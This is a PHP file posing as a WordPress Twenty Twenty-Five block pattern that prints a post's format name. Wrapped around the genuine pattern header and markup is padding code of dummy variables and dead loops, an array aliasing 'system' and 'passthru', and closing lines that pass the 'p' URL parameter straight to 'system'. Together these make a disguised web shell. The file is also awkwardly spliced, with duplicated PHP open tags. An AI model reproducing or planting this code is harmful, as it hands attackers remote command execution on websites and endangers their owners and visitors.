<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Title: Post format name
 * Slug: twentytwentyfive/binding-format
 * Categories: twentytwentyfive_post-format
 * Description: Prints the name of the post format with the help of the Block Bindings API.
 *
 * @package WordPress
 * @subpackage Twenty_Twenty_Five
 * @since Twenty Twenty-Five 1.0
 */

?>
<!-- wp:paragraph {"metadata":{"bindings":{"content":{"source":"twentytwentyfive/format"}}},"fontSize":"small"} -->
<p class="has-small-font-size"></p>
<!-- /wp:paragraph -->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>